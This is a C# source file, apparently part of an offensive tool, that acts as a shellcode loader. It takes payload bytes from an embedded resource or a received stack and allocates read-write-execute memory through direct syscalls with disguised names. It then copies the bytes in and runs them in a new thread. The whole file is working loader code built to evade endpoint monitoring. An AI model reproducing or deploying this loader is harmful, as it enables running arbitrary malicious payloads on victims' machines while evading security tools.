using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Reflection;
using System.IO;

namespace MySyscall
{
    class Execute
    {
        public static byte[] mybytearr;
        public static void exec() 
        {
            if (GetCode.UseRaw == true)
            {
                mybytearr = GetEmbeddedBin("dotnetlib");
            }
            else
            {
                Stack<byte> recvStack = GetCode.CodeStack();
                mybytearr = new byte[recvStack.Count];
                int mybytearrLen = recvStack.Count;
                for (int i = 0; i <= mybytearrLen; i++)
                {
                    try
                    {
                        mybytearr[i] = recvStack.Pop();
                    }
                    catch { break; }

                }
            }
            Gsyscallstub.Set_NtdllBaseADDR();
            IntPtr hCurrentProcess = Process.GetCurrentProcess().Handle;
            IntPtr pMemoryAllocation = new IntPtr();
            IntPtr pZeroBits = IntPtr.Zero;
            UIntPtr pAllocationSize = new UIntPtr(Convert.ToUInt32(mybytearr.Length));
            uint allocationType = (uint)WinNativeshit.Native.AllocationType.Commit | (uint)WinNativeshit.Native.AllocationType.Reserve;
            uint protection = (uint)WinNativeshit.Native.AllocationProtect.PAGE_EXECUTE_READWRITE;
            var ntAllocResult = NativeAPI.MYNAVM(hCurrentProcess, ref pMemoryAllocation, pZeroBits, ref pAllocationSize, allocationType, protection);

            Marshal.Copy(mybytearr, 0, (IntPtr)pMemoryAllocation, mybytearr.Length);

            IntPtr hThread = new IntPtr(0);
            WinNativeshit.Native.ACCESS_MASK desiredAccess = WinNativeshit.Native.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | WinNativeshit.Native.ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
            IntPtr pObjectAttributes = new IntPtr(0);
            IntPtr lpParameter = new IntPtr(0);
            bool bCreateSuspended = false;
            uint stackZeroBits = 0;
            uint sizeOfStackCommit = 0xFFFF;
            uint sizeOfStackReserve = 0xFFFF;
            IntPtr pBytesBuffer = new IntPtr(0);

            var hThreadResult = NativeAPI.MYMCT(out hThread, desiredAccess, pObjectAttributes, hCurrentProcess, pMemoryAllocation, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);

            var result = NativeAPI.MYWFSO(hThread, true, 0);


        }
        public static byte[] GetEmbeddedBin(string resourcesName) 
        {

            var EmbeddedRes = Assembly.GetExecutingAssembly();
            using (var rs = EmbeddedRes.GetManifestResourceStream(resourcesName))
            {
                if (rs != null)
                {
                    using (var ms = new MemoryStream())
                    {
                        rs.CopyTo(ms);
                        return ms.ToArray();
                    }
                }
                else
                {
                    return null;
                }

            }
        }
    }
}
